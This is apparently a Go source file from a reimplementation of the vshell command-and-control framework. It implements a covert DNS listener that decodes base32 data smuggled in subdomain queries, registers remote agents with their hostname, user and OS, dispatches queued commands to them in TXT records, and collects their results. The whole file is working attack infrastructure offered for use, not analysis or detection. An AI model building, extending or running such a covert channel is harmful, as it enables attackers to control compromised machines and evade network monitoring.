// Package c2engine/dns implements a covert DNS-based C2 channel.
package c2engine

import (
	"encoding/base32"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

// ============================================================================
// DNS C2 Listener - covert channel via DNS queries
// DNS C2 监听器——通过 DNS 查询的隐蔽信道
// ============================================================================
//
// The original vshell binary supports DNS as a C2 transport mode.
// Agents encode data in DNS subdomain queries like:
//   <base64_data>.<agent_id>.c2.example.com
//
// The server responds with encoded data in TXT records.
// 原版 vshell 支持 DNS 作为 C2 传输模式：Agent 将数据编码进 DNS 子域查询
// （<base64_data>.<agent_id>.c2.example.com），服务器以 TXT 记录返回编码数据。
// DNSListener implements a covert DNS C2 channel.
type DNSListener struct {
	mu          sync.RWMutex
	ID          int64
	Domain      string   // e.g., "c2.example.com"
	PublicDNS   string   // Public DNS server to use for resolution
	MaxSize     int      // Max DNS message size
	VerifyKey   string
	listener    net.PacketConn
	isRunning   bool
	stopCh      chan struct{}

	// Pending messages for agents (agentID -> message queue)
	pendingOut map[string][]string
	pendingMu  sync.RWMutex
}
// NewDNSListener creates a new DNS C2 listener.
func NewDNSListener(id int64, domain, publicDNS, verifyKey string, maxSize int) *DNSListener {
	if maxSize <= 0 {
		maxSize = 512
	}
	return &DNSListener{
		ID:         id,
		Domain:     domain,
		PublicDNS:  publicDNS,
		MaxSize:    maxSize,
		VerifyKey:  verifyKey,
		pendingOut: make(map[string][]string),
		stopCh:     make(chan struct{}),
	}
}
// Start begins listening for DNS queries.
func (dl *DNSListener) Start() error {
	dl.mu.Lock()
	defer dl.mu.Unlock()

	if dl.isRunning {
		return fmt.Errorf("DNS listener %d already running", dl.ID)
	}

	// Listen on UDP port 53
	conn, err := net.ListenPacket("udp", ":53")
	if err != nil {
		// Try alternate port
		conn, err = net.ListenPacket("udp", ":5353")
		if err != nil {
			return fmt.Errorf("failed to bind DNS listener: %w", err)
		}
	}
	dl.listener = conn
	dl.isRunning = true

	go dl.serve(conn)
	log.Printf("[DNS Listener %d] Started on domain %s", dl.ID, dl.Domain)
	return nil
}

func (dl *DNSListener) serve(conn net.PacketConn) {
	buf := make([]byte, 1500) // Max UDP DNS size
	for {
		select {
		case <-dl.stopCh:
			return
		default:
		}

		conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		n, addr, err := conn.ReadFrom(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			continue
		}

		// Copy the datagram: buf is reused by the next ReadFrom while handler
		// goroutines are still decoding the aliased slice, so passing buf[:n]
		// directly races concurrent queries against each other.
		pkt := make([]byte, n)
		copy(pkt, buf[:n])
		go dl.handleDNSQuery(pkt, addr)
	}
}

func (dl *DNSListener) handleDNSQuery(data []byte, addr net.Addr) {
	var msg dns.Msg
	if err := msg.Unpack(data); err != nil {
		return
	}

	if len(msg.Question) == 0 {
		return
	}

	question := msg.Question[0]
	domain := question.Name

	// Check if this query is for our C2 domain
	if !strings.HasSuffix(strings.ToLower(domain), strings.ToLower(dl.Domain)) {
		return
	}

	// Extract encoded data from subdomain
	// Format: <base64_data>.<padding>.<our_domain>
	subdomain := strings.TrimSuffix(strings.ToLower(domain), "."+strings.ToLower(dl.Domain))
	subdomain = strings.TrimSuffix(subdomain, ".")

	parts := strings.Split(subdomain, ".")
	encodedData := parts[0]

	// Extract agent ID from the subdomain
	agentID := "unknown"
	if len(parts) > 1 {
		agentID = parts[len(parts)-1]
	}

	// Decode the data (base64 or hex)
	decoded, err := dl.decodeData(encodedData)
	if err != nil {
		log.Printf("[DNS %d] Failed to decode data from %s: %v", dl.ID, addr.String(), err)
		return
	}

	// Process the C2 message
	response := dl.processMessage(agentID, string(decoded), addr.String())

	// Send response via DNS TXT record
	if response != "" {
		dl.sendDNSResponse(dl.listener, addr, msg, response)
	}
}

func (dl *DNSListener) decodeData(data string) ([]byte, error) {
	// 黑盒实锤（session 171-174）：DNS 标签 = Go 标准 base32
	// （日志 "NXDOMAIN: base32 decoding: illegal base32 data"）。
	// "testvkey" 标签 → base32 解码 → 5 字节（长度检查源）。
	return base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(data))
}

func (dl *DNSListener) encodeData(data string) string {
	// 原版 DNS 编码 = base32（Go 标准字母表 ABC...234567，无填充）
	return base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(data))
}

func (dl *DNSListener) processMessage(agentID, data, remoteAddr string) string {
	engine := GetEngine()

	// Parse the message
	msgType, payload := dl.parseDNSMessage(data)

	switch msgType {
	case "checkin":
		// Agent registration via DNS
		parts := strings.Split(payload, "|")
		hostname := ""
		username := ""
		osName := ""
		if len(parts) > 0 {
			hostname = parts[0]
		}
		if len(parts) > 1 {
			username = parts[1]
		}
		if len(parts) > 2 {
			osName = parts[2]
		}
		// DNS 通道的注册串同样只到这里），因此 Arch 留空。
		client, err := engine.NewClient(
			dl.VerifyKey,
			"dns",
			remoteAddr,
			"",
			username,
			hostname,
			osName,
			"dns_agent",
			"",
		)
		if err != nil {
			return "err:register_failed"
		}

		Logf("DNS %d: agent %d checked in (%s@%s)", dl.ID, client.ID, username, hostname)
		return fmt.Sprintf("ok:%d:%d", client.ID, 10) // client_id:poll_interval

	case "task":
		// Agent polling for tasks
		var clientID int64
		fmt.Sscanf(agentID, "%d", &clientID)

		// Update client
		if client := engine.GetClient(clientID); client != nil {
			client.UpdateSeen()
		}

		// Check for pending tasks
		tasks := engine.GetPendingTasks(clientID)
		if len(tasks) > 0 {
			task := tasks[0]
			task.Status = "dispatched"
			return fmt.Sprintf("task:%d:%s", task.ID, dl.encodeData(task.Command))
		}

		return "noop"

	case "result":
		// Task result submission
		parts := strings.SplitN(payload, ":", 2)
		if len(parts) == 2 {
			var taskID int64
			fmt.Sscanf(parts[0], "%d", &taskID)
			result := parts[1]
			engine.UpdateTask(taskID, result, "completed")
		}
		return "ack"

	default:
		return "noop"
	}
}

func (dl *DNSListener) parseDNSMessage(data string) (msgType string, payload string) {
	parts := strings.SplitN(data, ":", 2)
	if len(parts) == 2 {
		return parts[0], parts[1]
	}
	return "unknown", data
}

func (dl *DNSListener) sendDNSResponse(conn net.PacketConn, addr net.Addr, query dns.Msg, response string) {
	// Build DNS response
	resp := new(dns.Msg)
	resp.SetReply(&query)
	resp.Authoritative = true

	// Encode response in TXT records
	// Split into chunks that fit in DNS labels (63 chars max per label)
	encoded := dl.encodeData(response)
	chunks := splitDNSChunks(encoded, 60)

	for _, chunk := range chunks {
		resp.Answer = append(resp.Answer, &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   query.Question[0].Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    60,
			},
			Txt: []string{chunk},
		})
	}

	packed, err := resp.Pack()
	if err != nil {
		return
	}

	conn.WriteTo(packed, addr)
}

func splitDNSChunks(s string, chunkSize int) []string {
	var chunks []string
	for i := 0; i < len(s); i += chunkSize {
		end := i + chunkSize
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}
// Stop gracefully stops the DNS listener.
func (dl *DNSListener) Stop() error {
	dl.mu.Lock()
	defer dl.mu.Unlock()

	if !dl.isRunning {
		return nil
	}

	close(dl.stopCh)
	if dl.listener != nil {
		dl.listener.Close()
	}
	dl.isRunning = false
	log.Printf("[DNS Listener %d] Stopped", dl.ID)
	return nil
}
// IsRunning returns whether the listener is active.
func (dl *DNSListener) IsRunning() bool {
	dl.mu.RLock()
	defer dl.mu.RUnlock()
	return dl.isRunning
}


